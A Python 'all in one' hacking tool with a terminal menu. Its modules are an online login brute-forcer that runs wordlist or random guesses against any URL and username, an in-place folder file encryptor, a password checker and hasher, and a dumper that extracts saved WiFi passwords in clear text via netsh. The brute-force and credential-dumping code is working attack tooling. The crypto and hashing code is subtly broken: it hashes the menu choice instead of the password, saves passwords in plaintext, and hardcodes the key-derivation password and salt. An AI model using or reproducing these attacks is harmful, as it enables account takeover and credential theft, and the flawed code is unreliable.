# ----------Banner--------
from pyfiglet import Figlet
# ----------Fernet imports----------
import base64
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet, InvalidToken
import hashlib
# -----------Brute Force imports-------
import requests
import random
# -----------Check+Hasher imports-------
import re
import bcrypt
# -----------Wifi SSIDs imports-------
import subprocess
# -----------IMPORTS-------




custom_fig = Figlet(font='5lineoblique')
print(custom_fig.renderText("Welcome To Elvo All In One Tool"))


class AllinOne:
    def HackTools(Elvo):
        # custom_menu = Figlet(font='digital')
        print(('''
Welcome to the Main Menu!

    1.For Brute-Force             [1]
    2.For Fernet Encryption       [2]
    3.For Password Checker+Hasher [3]
    4.Wifi SSIDs                  [4]

 '''))
        User_Choice = input("And your choice would be?\n...: ")
        print("You chose...: ", User_Choice)

        # Test module!
        # if User_Choice == 'BRUTE FORCE':
        #     print("Nice")
        # elif User_Choice == 'AES':
        #     print("Nice")
        # else:
        #     print("Not an option :(")

        # -----------------------Brute Force-----------------------
        if User_Choice == '1':
            def QUESTIONBRUTEFORCE():
                custombruteforce = Figlet(font='bubble')

                print(custombruteforce.renderText('''"Welcome To Elvo\n 
                                                  Brute-Forcer'''))

                BruteIntro = print('''How would you like to Brute Force?

        1.With a Worldlist [1]
        2.With Random Numbers[2]
        3.With Your Own Characters[3]
        4. To Main Menu [4]
    ''')

                BruteChoice = input(str("And your choice would be?\n...: "))
                print("You chose...: ", BruteChoice)

                if BruteChoice == "1":

                    url = input('Place the URL: ')
                    username = input('Place the username: ')

                    # chars =  "123"

                    def send_request(username, passwd):
                        data = {
                            "username": username,
                            "password": passwd
                        }

                        r = requests.get(url, data=data)
                        return r

                    def implist():
                        print('ADD .txt TO THE FILE!')
                        worldlist = input('Wordlist Path...: ')
                        try:
                            file = open(worldlist, 'r')
                            tries = file.read().split('\n')
                            file.close()
                            return tries
                        except FileNotFoundError:
                            return print('\nsomething is incorrect :( Try again :)\n'), QUESTIONBRUTEFORCE()

                    def main(tries):
                        for passwd in tries:
                            r = send_request(username, passwd)

                            if 'failed to login' in r.text.lower():
                                print(f"Incorrect {passwd}\n")
                            else:
                                print(f"Correct Password | {passwd} | !\n")
                                break

                    tries = implist()
                    main(tries)

                elif BruteChoice == "2":

                    url = input('Place the URL: ')
                    username = input('Place the username: ')
                    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
                    try:

                        def send_request(username, passwd):
                            data = {
                                "username": username,
                                "password": passwd
                            }

                            r = requests.get(url, data=data)
                            return r

                        def main():
                            while True:
                                rndpasswd = random.choices(chars, k=2)
                                # k= is the password length.
                                passwd = "".join(rndpasswd)
                                # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                                r = send_request(username, passwd)

                                if 'failed to login' in r.text.lower():
                                    print(f"Incorrect {passwd}\n")
                                else:
                                    print(f"Correct Password | {passwd} | !\n")
                                    break

                        main()
                    except requests.exceptions.MissingSchema:
                        return print('\nsomething is incorrect :( Try again :)\n'), QUESTIONBRUTEFORCE()

                elif BruteChoice == "3":

                    url = input('Place the URL: ')
                    username = input('Place the username: ')
                    chars = input('Write the characters to use')
                    try:

                        def send_request(username, passwd):
                            data = {
                                "username": username,
                                "password": passwd
                            }

                            r = requests.get(url, data=data)
                            return r

                        def main():
                            while True:
                                rndpasswd = random.choices(chars, k=2)
                                # k= is the password length.
                                passwd = "".join(rndpasswd)
                                # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                                r = send_request(username, passwd)

                                if 'failed to login' in r.text.lower():
                                    print(f"Incorrect {passwd}\n")
                                else:
                                    print(f"Correct Password | {passwd} | !\n")
                                    break

                        main()
                    except requests.exceptions.MissingSchema:
                        return print('\nsomething is incorrect :( Try again :)\n'), QUESTIONBRUTEFORCE()

                elif BruteChoice == '4':
                    return object.HackTools('Elvo.a')

                else:
                    print("That's not one of the options... start again\n")
                    return QUESTIONBRUTEFORCE()

            QUESTIONBRUTEFORCE()
        # -----------------------Brute Force-----------------------

        # -----------------------Fernet-----------------------
        elif User_Choice == '2':
            custombruteforce = Figlet(font='bubble')
            print(custombruteforce.renderText("Welcome To Elvo\n "
                                              "Encryptor"))

            # ---------Generate Key-------------

            try:
                file = open('fernetkey.key', 'rb')
                key = file.read()
                file.close()
            except FileNotFoundError:
                key = Fernet.generate_key()
                file = open('fernetkey.key', 'wb')
                file.write(key)
                file.close()

            password_provided = "password"  # This is input in the form of a string
            password = password_provided.encode()  # Convert to type bytes
            salt = b'\n\x8dl\xfb&\x92\x86\xa6\x9e\xfb!\xec\xeb\x02\xcc\xee'
            # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
                backend=default_backend()
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))  # Can only use kdf once

            def QUESTIONFERNET():

                FERNETQUESTION = input('''What woud you like to do?"

   To Encrypt   [1]
   To Decrypt   [2]
   To Main Menu [3]
   ...:''')

                if FERNETQUESTION == '1':
                    # TODO: --------------Encryption--------------
                    folderpath = input('Place the Folder Path...: ')
                    looptimes = input('How many times to run...: ')
                    try:
                        number = int(looptimes)
                        pass
                    except ValueError:
                        print('\nSomething is\'nt right... try again.\n')
                        return QUESTIONFERNET()
                    if number <= 0:
                        number = 1

                    counter = 1
                    complete_files = []
                    for root, dir_names, file_names in os.walk(folderpath):
                        for f in file_names:
                            complete_files.append(os.path.join(root, f))

                        for times in range(number):
                            for file in complete_files:
                                fullpath = f'{file}'

                            input_file = fullpath
                            with open(input_file, 'rb') as f:
                                data = f.read()  # Read the bytes of the input file
                                base64encoding = base64.b64encode(str(input_file).encode('ascii'))
                                SHA256encoding = hashlib.sha256(str(input_file).encode('UTF-8')).hexdigest()
                                counter += 1

                            fernet = Fernet(key)
                            encrypted = fernet.encrypt(data)

                            with open(input_file, 'wb') as f:
                                f.write(encrypted)  # Write the encrypted bytes to the output file

                            print(
                                f'File Name...:{file}\nFile Number...:{counter}Looptime...:{times}\nBase64...:{base64encoding}\nSHA256...: {SHA256encoding}\n\n --------next file--------\n')

                elif FERNETQUESTION == '2':

                    # TODO: ------------------DECRYPTION--------------------

                    Question = input("Are you sure? Yes/No...: ").capitalize()
                    if Question == 'Yes':
                        folderpath = input('Place the Folder Path...: ')
                        looptimes = input('How many times to run...: ')
                        try:
                            number = int(looptimes)
                            pass
                        except ValueError:
                            print('\nSomething is\'nt right... try again.\n')
                            return QUESTIONFERNET()
                        if number <= 0:
                            number = 1

                        counter = 1
                        complete_files = []
                        for root, dir_names, file_names in os.walk(folderpath):
                            for f in file_names:
                                complete_files.append(os.path.join(root, f))

                            for times in range(number):
                                for file in complete_files:
                                    fullpath = f'{file}'

                                input_file = fullpath

                                with open(input_file, 'rb') as f:
                                    data = f.read()
                                    counter += 1

                                fernet = Fernet(key)
                                try:
                                    decrypted = fernet.decrypt(data)

                                    with open(input_file, 'wb') as f:
                                        f.write(decrypted)
                                        print(
                                            f'File Name...:{file}\nFile Number...:{counter}\nLooptimes...:{times}\n --------next file--------\n')


                                except InvalidToken as e:
                                    print("No more files to decrypt :)")


                    else:
                        print("That's not one of the options... start again\n")
                        return QUESTIONFERNET()

                elif FERNETQUESTION == '3':
                    return object.HackTools('Elvo.a')


                else:
                    return print('\nNOT AN OPTION TRY AGAIN!\n'), QUESTIONFERNET()

            QUESTIONFERNET()
            # -----------------------Fernet-----------------------

            # -----------------------Password Checker+Hasher-----------------------
        elif User_Choice == '3':
            customcheckerhasher = Figlet(font='bubble')

            print(customcheckerhasher.renderText('''Welcome To Elvo\nPassword Checker \nand Hasher'''))
            def PASSCHECKER():
                print(''' 
Welcome!
Here you can check if your password is strong enough.
Password MUST have:
    1. Minimum 6 characters long.
    2. Has to be in ENGLISH!.
    3. Has to have lower case letter.
    4. Has to have at least one number.
    5. Has to have at least one upper case character.
    6. Has to have at least one special character.
    7. Cant have spaces!.
                ''')

                PASSWORD = input("Check your password: ")
                x = True
                while x:
                    if (len(PASSWORD) < 6 or len(PASSWORD) > 100):
                        print("\nPassword length between 6 and 12 please")
                        break
                    elif not re.search("[a-z]", PASSWORD):
                        print("\nYou need at least one lower case letter")
                        break
                    elif not re.search("[0-9]", PASSWORD):
                        print("\nYou need at least one number")
                        break
                    elif not re.search("[A-Z]", PASSWORD):
                        print("\nYou need at least one upper case character")
                        break
                    elif not re.search("[!@#$%^&*]", PASSWORD):
                        print("\nYou need at least one special character please")
                        break
                    elif re.search("\s", PASSWORD):
                        print("\nYou cannot have blank spaces in your password...")
                        break

                    else:
                        print("Your Password is strong enough")
                        x = False

                        # -------------Password Hasher-------------
                        def PASSHASHER():
                            print('Would you like to hash your Password?')
                            PASSHASH = input('''
Yes       [1]
No        [2]
No brings you back the the Main Menu!
...:''')
                            y = True
                            while y:
                                if PASSHASH == '1':
                                    y = False
                                    PWDHASH = PASSHASH
                                    bytePWDHASH = PWDHASH.encode('utf-8')

                                    SALT = bcrypt.gensalt()
                                    hash = bcrypt.hashpw(bytePWDHASH, SALT).decode('utf-8')

                                    with open('Passwordhash.txt', 'w') as f:
                                        f.write('The Password you hashed: ')
                                        f.write(PASSWORD)
                                        f.write('\nYour Password Hash: ')
                                        f.write(hash)


                                    print('Password Info - ')
                                    print('Your Password: ', PASSWORD)
                                    print('Your Hashed Password:', hash)
                                    print('Your Passwords are save in:', os.getcwd() + '\Passwordhash.txt')

                                    return object.HackTools('Elvo.a')
                                elif PASSHASH == '2':
                                    break
                                else:
                                    print('try again')
                                return PASSHASHER()



                            if y:
                                return object.HackTools('Elvo.a')


                        # -------------Password Hasher-------------
                        PASSHASHER()
                        break

                if x:
                    print('\n-----ERROR-----')
                    print("Check the Error above!.")
                    print('Try a different password.')
                    print('-----ERROR-----')

                    PASSCHECKER()

            PASSCHECKER()

            # -----------------------Password Checker+Hasher-----------------------

            # -----------------------Wifi SSIDs-----------------------
        elif User_Choice == '4':

            customwifissid = Figlet(font='bubble')
            print(customwifissid.renderText("Welcome To Elvo\n "
                                              "Wifi Info"))
            def WIFISSID():

                print('Would you like to see all the WiFi Names and password on your network?')
                WIFIQU = input('''
Yes [1]
No  [2]
No would take you to the Main Menu!     
...:''')

                if WIFIQU == '1':

                    CMD = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
                    # .stdout.decode - shows all the wifi names in a table

                    WIFINAMES = (re.findall("All User Profile     : (.*)\r", CMD))
                    # finds all the "All user Profile" text in the CMD

                    WIFILISTNAMES = []
                    # creating an empty list for all the wifi usernames and password to be saved in

                    if len(WIFINAMES) != 0:
                        for name in WIFINAMES:
                            WIFIPROFILE = {}
                            # dictionary for each wifi profile

                            PROFILEINFO = subprocess.run(["netsh", "wlan", "show", "profile", name],
                                                         capture_output=True).stdout.decode()

                            if re.search("Security key           : Absent", PROFILEINFO):
                                continue
                            else:
                                WIFIPROFILE["ssid"] = name
                                PROFILEINFOPASS = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                                                 capture_output=True).stdout.decode()
                                PASSWORD = re.search("Key Content            : (.*)\r", PROFILEINFOPASS)
                                if PASSWORD == None:
                                    WIFIPROFILE["password"] = None

                                else:
                                    WIFIPROFILE["password"] = PASSWORD[1]


                                WIFILISTNAMES.append(WIFIPROFILE)

                    for x in range(len(WIFILISTNAMES)):

                        print('\n--------------------Wifi Network-----------------------')
                        print(WIFILISTNAMES[x])

                        print(f'--------------------------------------------------------')


                    object.HackTools('Elvo.a')

                elif WIFIQU == '2':
                    return object.HackTools('Elvo.a')
                else:
                    return WIFISSID()
            WIFISSID()

            # -----------------------Wifi SSIDs-----------------------

        else:
            print("\n\n\n\nNot an option :( , Try again...")
            return object.HackTools('Elvo.a')


object = AllinOne
object.HackTools('Elvo.a')